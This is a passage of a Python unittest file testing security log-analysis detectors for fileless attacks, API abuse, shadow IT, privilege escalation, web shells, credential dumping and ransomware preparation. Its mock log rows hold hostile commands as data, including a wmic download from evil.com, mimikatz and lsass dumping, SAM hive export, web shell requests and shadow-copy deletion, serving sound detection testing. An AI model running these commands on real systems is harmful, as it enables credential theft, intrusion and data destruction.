                'source_ip': '192.168.1.100',
                'process_name': 'powershell.exe',
                'command_line': 'powershell.exe -enc JABhAD0AJw -NoProfile -WindowStyle Hidden'
            })
        
        # Add some WMI activity
        for i in range(8):
            data.append({
                'source_ip': '192.168.1.100',
                'process_name': 'wmic.exe',
                'command_line': 'wmic process call create "cmd.exe /c downloadfile http://evil.com/payload"'
            })
        
        df = pd.DataFrame(data)
        col_map = {
            'source_ip': 'source_ip',
            'process_name': 'process_name',
            'command_line': 'command_line'
        }
        
        result = self.strategy.analyze(df, col_map)
        
        # Should detect fileless activity
        self.assertFalse(result.empty, "Should detect fileless attack patterns")
        self.assertGreaterEqual(result.iloc[0]['fileless_score'], 50)
        self.assertIn('source_ip', result.columns)
        self.assertIn('fileless_score', result.columns)
    
    def test_normal_processes_not_flagged(self):
        """Test that normal process activity is not flagged."""
        # Create mock data with benign processes
        data = []
        for i in range(10):
            data.append({
                'source_ip': '192.168.1.100',
                'process_name': 'chrome.exe',
                'command_line': 'chrome.exe --start-maximized'
            })
        
        df = pd.DataFrame(data)
        col_map = {
            'source_ip': 'source_ip',
            'process_name': 'process_name',
            'command_line': 'command_line'
        }
        
        result = self.strategy.analyze(df, col_map)
        
        # Should not flag normal activity
        self.assertTrue(result.empty, "Normal processes should not be flagged")
    
    def test_column_explanations(self):
        """Test that column explanations are provided."""
        explanations = self.strategy.get_column_explanations()
        self.assertIn('fileless_score', explanations)
        self.assertIn('source_ip', explanations)
        self.assertIn('suspicious_processes', explanations)


class TestAPIAbuseStrategy(unittest.TestCase):
    """Test the API Abuse strategy."""
    
    def setUp(self):
        """Set up test data."""
        self.strategy = APIAbuseStrategy()
    
    def test_api_abuse_detection(self):
        """Test that API abuse patterns are detected."""
        # Create mock data with excessive API requests
        base_time = datetime.now()
        data = []
        
        # Generate high volume API requests with rate limiting
        for i in range(600):
            status = '200'
            if i % 20 == 0:  # Some rate limit errors
                status = '429'
            
            data.append({
                'source_ip': '10.0.0.50',
                'url_path': f'/api/v1/users/{i % 10}',  # Low diversity
                'status_code': status,
                'timestamp': base_time + timedelta(seconds=i * 0.1)  # ~10 req/sec
            })
        
        df = pd.DataFrame(data)
        col_map = {
            'source_ip': 'source_ip',
            'url_path': 'url_path',
            'status_code': 'status_code',
            'timestamp': 'timestamp'
        }
        
        result = self.strategy.analyze(df, col_map)
        
        # Should detect API abuse
        self.assertFalse(result.empty, "Should detect API abuse patterns")
        self.assertGreaterEqual(result.iloc[0]['abuse_score'], 50)
        self.assertIn('source_ip', result.columns)
        self.assertIn('rate_limit_errors', result.columns)
    
    def test_normal_api_usage_not_flagged(self):
        """Test that normal API usage is not flagged."""
        # Create mock data with reasonable API usage
        data = []
        for i in range(15):
            data.append({
                'source_ip': '10.0.0.50',
                'url_path': f'/api/v1/profile',
                'status_code': '200'
            })
        
        df = pd.DataFrame(data)
        col_map = {
            'source_ip': 'source_ip',
            'url_path': 'url_path',
            'status_code': 'status_code'
        }
        
        result = self.strategy.analyze(df, col_map)
        
        # Should not flag normal usage
        self.assertTrue(result.empty, "Normal API usage should not be flagged")
    
    def test_column_explanations(self):
        """Test that column explanations are provided."""
        explanations = self.strategy.get_column_explanations()
        self.assertIn('abuse_score', explanations)
        self.assertIn('source_ip', explanations)
        self.assertIn('rate_limit_errors', explanations)


class TestShadowITStrategy(unittest.TestCase):
    """Test the Shadow IT strategy."""
    
    def setUp(self):
        """Set up test data."""
        self.strategy = ShadowITStrategy()
    
    def test_shadow_it_detection(self):
        """Test that shadow IT usage is detected."""
        # Create mock data with personal cloud usage
        data = []
        for i in range(30):
            data.append({
                'source_ip': '192.168.1.100',
                'dest_domain': 'dropbox.com',
                'bytes_uploaded': 50000000  # 50 MB
            })
        
        # Add some collaboration tools
        for i in range(20):
            data.append({
                'source_ip': '192.168.1.100',
                'dest_domain': 'slack.com',
                'bytes_uploaded': 10000000  # 10 MB
            })
        
        df = pd.DataFrame(data)
        col_map = {
            'source_ip': 'source_ip',
            'dest_domain': 'dest_domain',
            'bytes_uploaded': 'bytes_uploaded'
        }
        
        result = self.strategy.analyze(df, col_map)
        
        # Should detect shadow IT
        self.assertFalse(result.empty, "Should detect shadow IT usage")
        self.assertGreaterEqual(result.iloc[0]['shadow_score'], 50)
        self.assertIn('source_ip', result.columns)
        self.assertIn('cloud_services', result.columns)
    
    def test_approved_services_not_flagged(self):
        """Test that connections to approved services are not flagged."""
        # Create mock data with corporate services
        data = []
        for i in range(10):
            data.append({
                'source_ip': '192.168.1.100',
                'dest_domain': 'microsoft.com',
                'bytes_uploaded': 1000000
            })
        
        df = pd.DataFrame(data)
        col_map = {
            'source_ip': 'source_ip',
            'dest_domain': 'dest_domain'
        }
        
        result = self.strategy.analyze(df, col_map)
        
        # Should not flag approved services
        self.assertTrue(result.empty, "Approved services should not be flagged")
    
    def test_column_explanations(self):
        """Test that column explanations are provided."""
        explanations = self.strategy.get_column_explanations()
        self.assertIn('shadow_score', explanations)
        self.assertIn('source_ip', explanations)
        self.assertIn('cloud_services', explanations)


class TestPrivilegeEscalationStrategy(unittest.TestCase):
    """Test the Privilege Escalation strategy."""
    
    def setUp(self):
        """Set up test data."""
        self.strategy = PrivilegeEscalationStrategy()
    
    def test_privilege_escalation_detection(self):
        """Test that privilege escalation attempts are detected."""
        # Create mock data with suspicious privilege escalation activity
        data = []
        for i in range(15):
            data.append({
                'source_ip': '192.168.1.100',
                'username': 'jdoe',
                'command': 'sudo -i',
                'process_name': 'sudo'
            })
        
        # Add mimikatz execution
        for i in range(5):
            data.append({
                'source_ip': '192.168.1.100',
                'username': 'jdoe',
                'command': 'mimikatz.exe sekurlsa::logonpasswords',
                'process_name': 'mimikatz.exe'
            })
        
        # Add net user commands
        for i in range(8):
            data.append({
                'source_ip': '192.168.1.100',
                'username': 'jdoe',
                'command': 'net localgroup administrators /add',
                'process_name': 'net.exe'
            })
        
        df = pd.DataFrame(data)
        col_map = {
            'source_ip': 'source_ip',
            'username': 'username',
            'command': 'command',
            'process_name': 'process_name'
        }
        
        result = self.strategy.analyze(df, col_map)
        
        # Should detect privilege escalation
        self.assertFalse(result.empty, "Should detect privilege escalation attempts")
        self.assertGreaterEqual(result.iloc[0]['priv_esc_score'], 50)
        self.assertIn('source_ip', result.columns)
        self.assertIn('escalation_methods', result.columns)
    
    def test_normal_commands_not_flagged(self):
        """Test that normal user commands are not flagged."""
        # Create mock data with benign commands
        data = []
        for i in range(20):
            data.append({
                'source_ip': '192.168.1.100',
                'username': 'jdoe',
                'command': f'ls -la /home/user/file{i}.txt',
                'process_name': 'ls'
            })
        
        df = pd.DataFrame(data)
        col_map = {
            'source_ip': 'source_ip',
            'username': 'username',
            'command': 'command',
            'process_name': 'process_name'
        }
        
        result = self.strategy.analyze(df, col_map)
        
        # Should not flag normal activity
        self.assertTrue(result.empty, "Normal commands should not be flagged")
    
    def test_column_explanations(self):
        """Test that column explanations are provided."""
        explanations = self.strategy.get_column_explanations()
        self.assertIn('priv_esc_score', explanations)
        self.assertIn('source_ip', explanations)
        self.assertIn('escalation_methods', explanations)


class TestWebshellDetectionStrategy(unittest.TestCase):
    """Test the Webshell Detection strategy."""
    
    def setUp(self):
        """Set up test data."""
        self.strategy = WebshellDetectionStrategy()
    
    def test_webshell_detection(self):
        """Test that web shell activity is detected."""
        # Create mock data with web shell indicators
        data = []
        
        # POST requests to suspicious files
        for i in range(25):
            data.append({
                'source_ip': '10.0.0.50',
                'uri': '/uploads/shell.php?cmd=whoami',
                'method': 'POST',
                'status_code': '200',
                'user_agent': 'python-requests/2.28.0'
            })
        
        # Requests with suspicious parameters
        for i in range(15):
            data.append({
                'source_ip': '10.0.0.50',
                'uri': f'/admin.php?exec=ls&command=id',
                'method': 'POST',
                'status_code': '200',
                'user_agent': 'curl/7.68.0'
            })
        
        df = pd.DataFrame(data)
        col_map = {
            'source_ip': 'source_ip',
            'uri': 'uri',
            'method': 'method',
            'status_code': 'status_code',
            'user_agent': 'user_agent'
        }
        
        result = self.strategy.analyze(df, col_map)
        
        # Should detect web shell activity
        self.assertFalse(result.empty, "Should detect web shell patterns")
        self.assertGreaterEqual(result.iloc[0]['webshell_score'], 50)
        self.assertIn('source_ip', result.columns)
        self.assertIn('post_to_scripts', result.columns)
    
    def test_normal_web_traffic_not_flagged(self):
        """Test that normal web traffic is not flagged."""
        # Create mock data with normal web requests
        data = []
        for i in range(20):
            data.append({
                'source_ip': '10.0.0.50',
                'uri': f'/index.html',
                'method': 'GET',
                'status_code': '200',
                'user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/95.0'
            })
        
        df = pd.DataFrame(data)
        col_map = {
            'source_ip': 'source_ip',
            'uri': 'uri',
            'method': 'method',
            'status_code': 'status_code',
            'user_agent': 'user_agent'
        }
        
        result = self.strategy.analyze(df, col_map)
        
        # Should not flag normal traffic
        self.assertTrue(result.empty, "Normal web traffic should not be flagged")
    
    def test_column_explanations(self):
        """Test that column explanations are provided."""
        explanations = self.strategy.get_column_explanations()
        self.assertIn('webshell_score', explanations)
        self.assertIn('source_ip', explanations)
        self.assertIn('suspicious_uris', explanations)


class TestCredentialDumpingStrategy(unittest.TestCase):
    """Test the Credential Dumping strategy."""
    
    def setUp(self):
        """Set up test data."""
        self.strategy = CredentialDumpingStrategy()
    
    def test_credential_dumping_detection(self):
        """Test that credential dumping is detected."""
        # Create mock data with credential dumping activity
        data = []
        
        # Mimikatz usage
        for i in range(10):
            data.append({
                'source_ip': '192.168.1.100',
                'username': 'admin',
                'process_name': 'mimikatz.exe',
                'command': 'mimikatz.exe privilege::debug sekurlsa::logonpasswords'
            })
        
        # LSASS process access
        for i in range(8):
            data.append({
                'source_ip': '192.168.1.100',
                'username': 'admin',
                'process_name': 'procdump.exe',
                'command': 'procdump.exe -ma lsass.exe lsass.dmp'
            })
        
        # Registry hive exports
        for i in range(5):
            data.append({
                'source_ip': '192.168.1.100',
                'username': 'admin',
                'process_name': 'reg.exe',
                'command': 'reg save hklm\\sam sam.hiv'
            })
        
        df = pd.DataFrame(data)
        col_map = {
            'source_ip': 'source_ip',
            'username': 'username',
            'process_name': 'process_name',
            'command': 'command'
        }
        
        result = self.strategy.analyze(df, col_map)
        
        # Should detect credential dumping
        self.assertFalse(result.empty, "Should detect credential dumping")
        self.assertGreaterEqual(result.iloc[0]['cred_dump_score'], 50)
        self.assertIn('source_ip', result.columns)
        self.assertIn('tools_detected', result.columns)
    
    def test_normal_processes_not_flagged(self):
        """Test that normal process activity is not flagged."""
        # Create mock data with benign processes
        data = []
        for i in range(20):
            data.append({
                'source_ip': '192.168.1.100',
                'username': 'jdoe',
                'process_name': 'notepad.exe',
                'command': 'notepad.exe document.txt'
            })
        
        df = pd.DataFrame(data)
        col_map = {
            'source_ip': 'source_ip',
            'username': 'username',
            'process_name': 'process_name',
            'command': 'command'
        }
        
        result = self.strategy.analyze(df, col_map)
        
        # Should not flag normal processes
        self.assertTrue(result.empty, "Normal processes should not be flagged")
    
    def test_column_explanations(self):
        """Test that column explanations are provided."""
        explanations = self.strategy.get_column_explanations()
        self.assertIn('cred_dump_score', explanations)
        self.assertIn('source_ip', explanations)
        self.assertIn('tools_detected', explanations)


class TestRansomwareIndicatorStrategy(unittest.TestCase):
    """Test the Ransomware Indicator strategy."""
    
    def setUp(self):
        """Set up test data."""
        self.strategy = RansomwareIndicatorStrategy()
    
    def test_ransomware_indicators_detection(self):
        """Test that ransomware preparation indicators are detected."""
        # Create mock data with ransomware preparation activity
        data = []
        
        # Shadow copy deletion
        for i in range(5):
            data.append({
                'source_ip': '192.168.1.100',
                'username': 'admin',
                'command': 'vssadmin delete shadows /all /quiet',
                'file_path': 'N/A'
            })
        
        # Backup interference
        for i in range(5):
            data.append({
                'source_ip': '192.168.1.100',
                'username': 'admin',
                'command': 'net stop backup',
                'file_path': 'N/A'
            })
        
        # Boot config tampering
        for i in range(3):
            data.append({
                'source_ip': '192.168.1.100',
                'username': 'admin',
                'command': 'bcdedit /set {default} bootstatuspolicy ignoreallfailures',
                'file_path': 'N/A'
            })
        
        # Add encrypted files
        for i in range(20):
            data.append({
                'source_ip': '192.168.1.100',
                'username': 'admin',
                'command': 'N/A',
                'file_path': f'/home/user/document{i}.txt.locked'
            })
        
        df = pd.DataFrame(data)
        col_map = {
            'source_ip': 'source_ip',
            'username': 'username',
            'command': 'command',
            'file_path': 'file_path'
        }
        
        result = self.strategy.analyze(df, col_map)
        
        # Should detect ransomware indicators
        self.assertFalse(result.empty, "Should detect ransomware indicators")
        self.assertGreaterEqual(result.iloc[0]['ransomware_score'], 50)
        self.assertIn('source_ip', result.columns)
        self.assertIn('preparation_commands', result.columns)
    
    def test_normal_activity_not_flagged(self):
        """Test that normal system activity is not flagged."""
        # Create mock data with benign activity
        data = []
        for i in range(15):
            data.append({
                'source_ip': '192.168.1.100',
                'username': 'jdoe',
                'command': f'copy file{i}.txt backup/',
                'file_path': f'/home/user/file{i}.txt'
            })
        
        df = pd.DataFrame(data)
        col_map = {
            'source_ip': 'source_ip',
            'username': 'username',
            'command': 'command',
            'file_path': 'file_path'
        }
        
        result = self.strategy.analyze(df, col_map)
        
        # Should not flag normal activity
        self.assertTrue(result.empty, "Normal activity should not be flagged")
    
    def test_column_explanations(self):
        """Test that column explanations are provided."""
        explanations = self.strategy.get_column_explanations()
        self.assertIn('ransomware_score', explanations)
        self.assertIn('source_ip', explanations)
        self.assertIn('preparation_commands', explanations)


if __name__ == '__main__':
    unittest.main()
